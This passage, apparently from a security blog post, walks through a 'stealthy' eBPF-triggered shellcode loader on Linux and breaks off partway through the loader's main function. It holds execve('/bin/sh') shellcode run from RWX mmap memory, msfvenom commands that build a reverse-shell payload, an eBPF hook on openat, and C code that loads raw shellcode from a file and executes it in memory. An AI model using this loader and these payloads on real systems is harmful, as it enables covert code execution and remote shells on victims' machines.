<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Shellcode Loader with eBPF Â· pwnbuffer
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="pwnbuffer">
<meta name="description" content="A simple and straightforward paper on how to use eBPF to intercept syscalls and execute shellcode in memory.">
<meta name="keywords" content="hack the planet!">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Shellcode Loader with eBPF">
  <meta name="twitter:description" content="A simple and straightforward paper on how to use eBPF to intercept syscalls and execute shellcode in memory.">

<meta property="og:url" content="https://pwnbuffer.org/en/posts/slayer/shellcode-loader-with-ebpf/">
  <meta property="og:site_name" content="pwnbuffer">
  <meta property="og:title" content="Shellcode Loader with eBPF">
  <meta property="og:description" content="A simple and straightforward paper on how to use eBPF to intercept syscalls and execute shellcode in memory.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-08T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-08T00:00:00+00:00">
    <meta property="article:tag" content="Low Level">
    <meta property="article:tag" content="Programming">
    <meta property="article:tag" content="Linux">




<link rel="canonical" href="https://pwnbuffer.org/en/posts/slayer/shellcode-loader-with-ebpf/">


<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">

<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  

  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://pwnbuffer.org/en/">
      pwnbuffer
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/posts/">Articles</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/categories/">Categories</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/members/">Members</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/contribute/">Contribute</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/wallpapers/">Wallpapers</a>
            </li>
          
        
        
          
          
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://pwnbuffer.org/posts/slayer/shellcode-loader-with-ebpf/">ðŸ‡§ðŸ‡·</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://pwnbuffer.org/en/posts/slayer/shellcode-loader-with-ebpf/">
              Shellcode Loader with eBPF
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-06-08T00:00:00Z">
                June 8, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              10-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/authors/slayer/">Slayer</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/categories/low-level/">Low-Level</a>
      <span class="separator">â€¢</span>
    <a href="https://pwnbuffer.org/en/categories/linux/">Linux</a>
      <span class="separator">â€¢</span>
    <a href="https://pwnbuffer.org/en/categories/kernel/">Kernel</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/low-level/">Low Level</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/programming/">Programming</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/linux/">Linux</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <hr>
<h1 id="introduction">
  Introduction
  <a class="heading-link" href="#introduction">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>In recent years, the Extended Berkeley Packet Filter (eBPF) has emerged as a very powerful technology within the Linux kernel, allowing the efficient and secure execution of custom software directly in the kernel, without the need to modify its source code. Originally created for packet sniffing, eBPF has evolved into a highly versatile observability, security and automation platform.</strong></p>
<p><strong>In parallel, shellcode remains a classic and yet extremely relevant technique within the &ldquo;arsenal&rdquo;. Shellcodes are compressed snippets of machine language code that perform a specific action, often used to obtain remote shells, escalate privileges or exploit flaws.</strong></p>
<p><strong>In this paper, we explore the integration between eBPF and shellcode loaders, a field that has not been explored much. The idea is to use eBPF to monitor system events (such as the famous syscalls) and from there, execute shellcode directly in user-land memory. This approach provides a highly stealthy means of executing malicious code, taking advantage of the low overhead of eBPF and the difficulty of detecting dynamically injected shellcodes</strong></p>
<p><strong>The purpose of this paper is to demonstrate a functional proof of concept of how this can be done, explaining each part of the process!</strong></p>
<hr>
<h1 id="1---objective">
  1 - Objective
  <a class="heading-link" href="#1---objective">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>The main objective of this paper is to demonstrate a practical approach for integrating kernel-land and user-land, through two central points:</strong></p>
<ul>
<li>
<p><strong>Interception of syscalls with eBPF -&gt; code an eBPF program attached to a kernel tracepoint to capture specific events, in this case, the <code>openat()</code> syscall. This allows real-time monitoring of system activity, without significant performance impact, and with isolation guaranteed by the eBPF sandbox</strong></p>
</li>
<li>
<p><strong>Loading and executing shellcode in memory in user-land: after activation via kernel event, the program in user-land is responsible for loading a shellcode previously compiled for the <code>x64_86</code> architecture into an executable region of memory, using <code>mmap()</code> (we will talk more about it later in this same paper). The shellcode is then executed directly in memory, eliminating the need for temporary files or other detectable artifacts</strong></p>
</li>
</ul>
<hr>
<h1 id="2---fundamentals">
  2 - Fundamentals
  <a class="heading-link" href="#2---fundamentals">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<h2 id="21---ebpf">
  2.1 - eBPF
  <a class="heading-link" href="#21---ebpf">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p><strong>eBPF (Extended Berkeley Packet Filter) is a Linux kernel technology that allows the safe execution of bytecode programs within the kernel itself, in an isolated and controlled manner. Originally designed for network packet filtering, eBPF has evolved into a generalized platform capable of monitoring and changing the behavior of the operating system in real time, without the need to modify or restart the kernel</strong></p>
<p><strong>eBPF programs are written in a restricted language (usually C compiled to BPF bytecode via LLVM/Clang) and loaded into the kernel using the <code>bpf()</code> interface or libs such as <code>libbpf</code>. Before execution, this bytecode goes through a rigorous verification process to ensure that it does not cause instability or compromise the kernel (for example, checking for infinite loops or invalid memory accesses)</strong></p>
<p><strong>eBPF programs can be attached to various points in the kernel, such as tracepoints, kprobes, uprobes, cgroups, sockets, etc., allowing the capture and manipulation of system events!</strong></p>
<h3 id="tracepoints-sys_enter_openat-in-this-case">
  tracepoints (sys_enter_openat in this case)
  <a class="heading-link" href="#tracepoints-sys_enter_openat-in-this-case">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p><strong>In the example of this paper, we use a tracepoint in the kernel called <code>sys_enter_openat</code>, which is triggered every time a process executes the <code>openat()</code> syscall. This tracepoint provides access to the syscall arguments (such as the path of the file being opened) at the time of invocation</strong></p>
<p><strong>Attaching an eBPF program to this tracepoint allows you to intercept this information efficiently and safely, enabling, for example, detailed monitoring of file activity in real time!</strong></p>
<h3 id="ebpf-isolation">
  eBPF isolation
  <a class="heading-link" href="#ebpf-isolation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p><strong>The eBPF environment runs in a sandbox, without direct access to critical kernel structures, so this reduces the risk of failures and maintains system stability, while allowing tools to monitor and interact with the kernel safely and effectively</strong></p>
<h2 id="22---shellcode">
  2.2 - Shellcode
  <a class="heading-link" href="#22---shellcode">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p><strong>Shellcode is a piece of code that does something specific when executed, usually used in exploits to open a shell, execute commands or download payloads. Despite the name, not all shellcode opens a shell. It can only create files, connect to the network or execute any valid instruction</strong></p>
<h3 id="how-the-hell-is-it-executed">
  How the hell is it executed?
  <a class="heading-link" href="#how-the-hell-is-it-executed">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p><strong>Shellcode is usually injected and executed in memory, so the process is basically:</strong></p>
<ul>
<li><strong>1 -&gt; allocate memory with execution permission (for example: <code>mmap()</code> or <code>malloc()</code> + <code>mprotect()</code>)</strong></li>
<li><strong>2 -&gt; copy the shellcode to this memory</strong></li>
<li><strong>3 -&gt; create a function that points to the shellcode and call it</strong></li>
</ul>
<p><strong>Well, to exemplify, here is a very simple C code that invokes a sh shell through a shellcode:</strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
<label for="tab-0-0" class="tab-label">C</label>
<div class="tab-content tab-content-0-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/mman.h&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">char</span> shellcode[] <span style="color:#ec0000">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#008900">0x48</span>, <span style="color:#008900">0x31</span>, <span style="color:#008900">0xc0</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x89</span>, <span style="color:#008900">0xc2</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x89</span>, <span style="color:#008900">0xc6</span>, <span style="color:#008900">0x48</span>, <span style="color:#008900">0x8d</span>, <span style="color:#008900">0x3d</span>, <span style="color:#008900">0x04</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0x00</span>, <span style="color:#008900">0xb0</span>, <span style="color:#008900">0x3b</span>, <span style="color:#008900">0x0f</span>, <span style="color:#008900">0x05</span>, <span style="color:#008900">0x2f</span>, <span style="color:#008900">0x62</span>, <span style="color:#008900">0x69</span>, <span style="color:#008900">0x6e</span>, <span style="color:#008900">0x2f</span>, <span style="color:#008900">0x73</span>, <span style="color:#008900">0x68</span>, <span style="color:#008900">0x00</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>mem <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>, <span style="color:#008900">4096</span>,
</span></span><span style="display:flex;"><span>    PROT_READ <span style="color:#ec0000">|</span> PROT_WRITE <span style="color:#ec0000">|</span> PROT_EXEC,
</span></span><span style="display:flex;"><span>    MAP_ANON <span style="color:#ec0000">|</span> MAP_PRIVATE, <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">memcpy</span>(mem, shellcode, <span style="color:#ec0000">sizeof</span>(shellcode));
</span></span><span style="display:flex;"><span>    ((<span style="color:#5f5fff">void</span>(<span style="color:#ec0000">*</span>)())mem)();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<h4 id="generation-with-msfvenom">
  Generation with msfvenom:
  <a class="heading-link" href="#generation-with-msfvenom">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p><strong>A practical and quick way to generate shellcodes is with msfvenom, from metasploit, here I will leave some examples of how to generate shellcodes with msfvenom:</strong></p>
<p><strong>generate shellcode for a reverse shell in x86_64;</strong>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
<label for="tab-1-0" class="tab-label">bash</label>
<div class="tab-content tab-content-1-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp <span style="color:#ec0000">LHOST</span><span style="color:#ec0000">=</span>127.0.0.1 <span style="color:#ec0000">LPORT</span><span style="color:#ec0000">=</span><span style="color:#008900">1337</span> -f c
</span></span></code></pre></div>
</div>




</div>


</p>
<p><strong>this generates the shellcode in C format to be copied directly into the code, but you can also generate a &ldquo;pure&rdquo; shellcode in binary like this:</strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
<label for="tab-2-0" class="tab-label">bash</label>
<div class="tab-content tab-content-2-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp <span style="color:#ec0000">LHOST</span><span style="color:#ec0000">=</span>127.0.0.1 <span style="color:#ec0000">LPORT</span><span style="color:#ec0000">=</span><span style="color:#008900">1337</span> -f raw -o pwnbuffer.bin
</span></span></code></pre></div>
</div>




</div>



<h2 id="23---loader-integration">
  2.3 - Loader integration
  <a class="heading-link" href="#23---loader-integration">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p><strong>Now, we raise a question: why use <code>mmap()</code> with <code>PROT_EXEC</code>? In a straightforward way, we need a memory region that can execute code. <code>mmap()</code> with <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> allows us to allocate space where we copy the shellcode and can execute it directly in RAM!</strong></p>
<p><strong>eBPF requires that its maps and programs be locked in memory (no swap), so the role of <code>RLIMIT_MEMLOCK</code> is to define how much memory the process can lock. If it is too low, <code>bpf()</code> fails with <code>EPERM</code>, so we increase this limit with:</strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-3-0:checked ~ .tab-content-3-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-3" id="tab-3-0" checked/>
<label for="tab-3-0" class="tab-label">C</label>
<div class="tab-content tab-content-3-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ec0000">struct</span> rlimit r <span style="color:#ec0000">=</span> {RLIM_INFINITY, RLIM_INFINITY};
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">setrlimit</span>(RLIMIT_MEMLOCK, <span style="color:#ec0000">&amp;</span>r);
</span></span></code></pre></div>
</div>




</div>



<p><strong>Without this, the loader won&rsquo;t even load the eBPF.</strong></p>
<hr>
<h1 id="3---implementation">
  3 - Implementation
  <a class="heading-link" href="#3---implementation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<h2 id="31---ebpf-code-kernel-land">
  3.1 - eBPF Code (kernel-land)
  <a class="heading-link" href="#31---ebpf-code-kernel-land">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p><strong>The following C code defines the eBPF program that will be loaded into the kernel and attached to the <code>sys_enter_openat</code> tracepoint. This tracepoint is triggered whenever a process executes the <code>openat()</code> syscall used internally by functions such as <code>open()</code> and <code>fopen()</code></strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-4-0:checked ~ .tab-content-4-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-4" id="tab-4-0" checked/>
<label for="tab-4-0" class="tab-label">C</label>
<div class="tab-content tab-content-4-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;linux/bpf.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;bpf/bpf_helpers.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;linux/ptrace.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;linux/types.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;linux/stat.h&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">struct</span> trace_event {
</span></span><span style="display:flex;"><span>    __u64           pad;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span>             dfd;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">const</span> <span style="color:#5f5fff">char</span>     <span style="color:#ec0000">*</span>filename;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span>             flags;      
</span></span><span style="display:flex;"><span>    __u32           mode;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">char</span> LICENSE[] <span style="color:#5f5fff">SEC</span>(<span style="color:#008900">&#34;license&#34;</span>) <span style="color:#ec0000">=</span> <span style="color:#008900">&#34;GPL&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">SEC</span>(<span style="color:#008900">&#34;tracepoint/syscalls/sys_enter_openat&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">trace_openat</span>(<span style="color:#ec0000">struct</span> trace_event <span style="color:#ec0000">*</span>ctx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> first_byte <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_probe_read_user</span>(<span style="color:#ec0000">&amp;</span>first_byte,
</span></span><span style="display:flex;"><span>                       <span style="color:#ec0000">sizeof</span>(first_byte),
</span></span><span style="display:flex;"><span>                       ctx<span style="color:#ec0000">-&gt;</span>filename);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_printk</span>(<span style="color:#008900">&#34;PWNED!! %c</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, first_byte);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<p><strong>&ldquo;What does the code do?&rdquo;</strong></p>
<ul>
<li><strong>intercepts calls to <code>openat()</code></strong></li>
<li><strong>reads the first character of the file name being opened</strong></li>
<li><strong>uses <code>bpf_printk()</code> to log to <code>/sys/kernel/debug/tracing/trace_pipe</code></strong></li>
</ul>
<p><strong>So, this allows you to monitor in real time what is being accessed by the system without invasive hooks!</strong></p>
<h2 id="32---code-loader-user-land">
  3.2 - Code loader (user-land)
  <a class="heading-link" href="#32---code-loader-user-land">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p><strong>The loader is the user-land program responsible for loading the eBPF into the kernel, and then, loading and executing a shellcode directly from memory! Here is the loader code in C:</strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-5-0:checked ~ .tab-content-5-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-5" id="tab-5-0" checked/>
<label for="tab-5-0" class="tab-label">C</label>
<div class="tab-content tab-content-5-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/mman.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;sys/resource.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;bpf/libbpf.h&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">static</span> <span style="color:#5f5fff">void</span> <span style="color:#5f5fff">bump_memlock_rlimit</span>(<span style="color:#5f5fff">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> rlimit r <span style="color:#ec0000">=</span> { RLIM_INFINITY, RLIM_INFINITY };
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#5f5fff">setrlimit</span>(RLIMIT_MEMLOCK, <span style="color:#ec0000">&amp;</span>r)) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;setrlimit(RLIMIT_MEMLOCK)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">static</span> <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span><span style="color:#5f5fff">load_shellcode</span>(<span style="color:#ec0000">const</span> <span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    FILE <span style="color:#ec0000">*</span>f <span style="color:#ec0000">=</span> <span style="color:#5f5fff">fopen</span>(path, <span style="color:#008900">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>f) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;fopen(shellcode)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">fseek</span>(f, <span style="color:#008900">0</span>, SEEK_END);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">size_t</span> size <span style="color:#ec0000">=</span> <span style="color:#5f5fff">ftell</span>(f);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">rewind</span>(f);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> <span style="color:#ec0000">*</span>mem <span style="color:#ec0000">=</span> <span style="color:#5f5fff">mmap</span>(<span style="color:#ec0000">NULL</span>,
</span></span><span style="display:flex;"><span>                     size,
</span></span><span style="display:flex;"><span>                     PROT_READ <span style="color:#ec0000">|</span> PROT_WRITE <span style="color:#ec0000">|</span> PROT_EXEC,
</span></span><span style="display:flex;"><span>                     MAP_ANONYMOUS <span style="color:#ec0000">|</span> MAP_PRIVATE,
</span></span><span style="display:flex;"><span>                     <span style="color:#ec0000">-</span><span style="color:#008900">1</span>, <span style="color:#008900">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (mem <span style="color:#ec0000">==</span> MAP_FAILED) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;mmap&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fclose</span>(f);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#5f5fff">fread</span>(mem, <span style="color:#008900">1</span>, size, f) <span style="color:#ec0000">!=</span> size) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;fread(shellcode)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">munmap</span>(mem, size);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fclose</span>(f);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">fclose</span>(f);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> mem;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>(<span style="color:#5f5fff">int</span> argc, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">**</span>argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_object <span style="color:#ec0000">*</span>obj;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_program <span style="color:#ec0000">*</span>prog;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_link <span style="color:#ec0000">*</span>link;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span> err;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bump_memlock_rlimit</span>();
</span></span><span style="display:flex;"><span>    obj <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_object__open_file</span>(<span style="color:#008900">&#34;ebpf_prog.o&#34;</span>, <span style="color:#ec0000">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>obj) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to open ebpf_prog.o</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    err <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_object__load</span>(obj);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (err) {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to load eBPF object: %d</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, err);
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_object__for_each_program</span>(prog, obj) {
